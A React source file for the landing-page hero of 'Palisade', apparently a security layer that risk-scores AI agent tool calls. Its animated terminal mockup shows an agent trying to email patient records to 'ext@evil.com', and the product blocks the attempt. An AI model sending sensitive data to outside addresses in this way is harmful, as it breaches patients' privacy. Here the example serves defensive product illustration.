"use client";

import { motion } from "framer-motion";
import { TextReveal, Parallax } from "./AnimatedSection";

export function Hero() {
  return (
    <section className="relative pt-36 pb-24 px-6 overflow-hidden">
      {/* Floating parallax shapes */}
      <Parallax speed={0.3} className="absolute top-20 left-[8%] pointer-events-none">
        <div className="h-16 w-16 rounded-2xl border border-[#e5e5e5] bg-[#fafafa] rotate-12 opacity-40" />
      </Parallax>
      <Parallax speed={-0.2} className="absolute top-32 right-[10%] pointer-events-none">
        <div className="h-10 w-10 rounded-full border border-[#dcfce7] bg-[#f0fdf4] opacity-50" />
      </Parallax>
      <Parallax speed={0.15} className="absolute bottom-24 left-[15%] pointer-events-none">
        <div className="h-8 w-8 rounded-lg border border-[#e5e5e5] bg-[#fafafa] -rotate-6 opacity-30" />
      </Parallax>
      <Parallax speed={-0.25} className="absolute top-48 right-[20%] pointer-events-none">
        <div className="h-6 w-6 rounded-md border border-[#dcfce7] bg-[#f0fdf4] rotate-45 opacity-35" />
      </Parallax>
      <Parallax speed={0.4} className="absolute bottom-32 right-[8%] pointer-events-none">
        <div className="h-12 w-12 rounded-xl border border-[#e5e5e5] bg-[#fafafa] rotate-[20deg] opacity-25" />
      </Parallax>

      <div className="relative mx-auto max-w-3xl text-center">
        {/* Badge */}
        <motion.div
          initial={{ opacity: 0, y: 16, scale: 0.95 }}
          animate={{ opacity: 1, y: 0, scale: 1 }}
          transition={{ duration: 0.5, delay: 0.05 }}
        >
          <span className="inline-flex items-center gap-2 rounded-full border border-[#e5e5e5] bg-[#fafafa] px-3.5 py-1 text-[12px] font-medium text-[#737373]">
            <span className="h-1.5 w-1.5 rounded-full bg-[#16a34a] animate-pulse" />
            Now with OpenClaw integration
          </span>
        </motion.div>

        {/* Headline — word-by-word reveal */}
        <div className="mt-7 text-[clamp(2.25rem,5vw,3.5rem)] font-semibold leading-[1.1] tracking-tight text-[#0a0a0a]">
          <TextReveal text="Runtime intelligence" delay={0.15} />
          <br />
          <TextReveal text="for AI agents" delay={0.35} />
        </div>

        {/* Sub */}
        <motion.p
          initial={{ opacity: 0, y: 16, filter: "blur(4px)" }}
          animate={{ opacity: 1, y: 0, filter: "blur(0px)" }}
          transition={{ duration: 0.6, delay: 0.55 }}
          className="mt-5 text-[17px] leading-relaxed text-[#737373] max-w-xl mx-auto"
        >
          The security layer between AI agents and the real world. Risk-scored
          decisions, exfiltration detection, and a real-time audit trail for
          every tool call.
        </motion.p>

        {/* CTAs */}
        <motion.div
          initial={{ opacity: 0, y: 12 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.5, delay: 0.7 }}
          className="mt-9 flex items-center justify-center gap-3"
        >
          <a
            href="#waitlist"
            className="rounded-full bg-[#0a0a0a] px-6 py-2.5 text-[14px] font-medium text-white transition-all hover:opacity-80 hover:scale-[1.02] active:scale-[0.98]"
          >
            Get Early Access
          </a>
          <a
            href="#docs"
            className="rounded-full border border-[#e5e5e5] bg-white px-6 py-2.5 text-[14px] font-medium text-[#0a0a0a] transition-all hover:bg-[#fafafa] hover:scale-[1.02] active:scale-[0.98]"
          >
            Documentation
          </a>
        </motion.div>
      </div>

      {/* Terminal */}
      <motion.div
        initial={{ opacity: 0, y: 40, scale: 0.97 }}
        animate={{ opacity: 1, y: 0, scale: 1 }}
        transition={{ duration: 0.8, delay: 0.85, ease: [0.25, 0.1, 0.25, 1] }}
        className="mx-auto mt-16 max-w-2xl"
      >
        <div className="overflow-hidden rounded-xl border border-[#e5e5e5] shadow-sm transition-shadow hover:shadow-[0_4px_30px_rgba(0,0,0,0.06)]">
          {/* Title bar */}
          <div className="flex items-center gap-2 border-b border-[#e5e5e5] bg-[#fafafa] px-4 py-2.5">
            <div className="flex gap-1.5">
              <span className="h-3 w-3 rounded-full bg-[#ff5f57]" />
              <span className="h-3 w-3 rounded-full bg-[#febc2e]" />
              <span className="h-3 w-3 rounded-full bg-[#28c840]" />
            </div>
            <span className="ml-2 text-[11px] font-mono text-[#a3a3a3]">
              palisade &mdash; policy evaluation
            </span>
          </div>
          {/* Content — lines animate in */}
          <div className="bg-white p-5 font-mono text-[13px] leading-[1.7] text-left space-y-1.5">
            <motion.p
              initial={{ opacity: 0, x: -8 }}
              animate={{ opacity: 1, x: 0 }}
              transition={{ delay: 1.1 }}
              className="text-[#a3a3a3]"
            >
              # Agent tries to exfiltrate medical data
            </motion.p>
            <motion.p
              initial={{ opacity: 0, x: -8 }}
              animate={{ opacity: 1, x: 0 }}
              transition={{ delay: 1.2 }}
            >
              <span className="text-[#16a34a]">$</span>{" "}
              <span className="text-[#0a0a0a]">palisade evaluate</span>{" "}
              <span className="text-[#737373]">--tool send_email</span>
            </motion.p>
            <motion.p
              initial={{ opacity: 0, x: -8 }}
              animate={{ opacity: 1, x: 0 }}
              transition={{ delay: 1.3 }}
              className="text-[#a3a3a3] pl-4"
            >
              {`--args '{"to":"ext@evil.com","body":"<patient_records>"}'`}
            </motion.p>
            <motion.div
              initial={{ opacity: 0, y: 8, scale: 0.98 }}
              animate={{ opacity: 1, y: 0, scale: 1 }}
              transition={{ delay: 1.5, duration: 0.5 }}
              className="mt-3 rounded-lg border border-[#fee2e2] bg-[#fef2f2] px-4 py-3 space-y-1"
            >
              <p className="flex items-center gap-2">
                <motion.span
                  initial={{ scale: 0 }}
                  animate={{ scale: 1 }}
                  transition={{ delay: 1.7, type: "spring", bounce: 0.4 }}
                  className="inline-flex h-5 items-center rounded bg-[#dc2626] px-1.5 text-[11px] font-semibold text-white"
                >
                  BLOCK
                </motion.span>
                <span className="text-[#0a0a0a]">risk score: 60</span>
              </p>
              <p className="text-[#737373] text-[12px]">
                Data exfiltration: sensitive data (medical) + external system (send_email)
              </p>
              <p className="text-[#a3a3a3] text-[11px]">
                Rules: touchesSensitiveData(30) + affectsExternalSystem(30)
              </p>
            </motion.div>
          </div>
        </div>
      </motion.div>
    </section>
  );
}
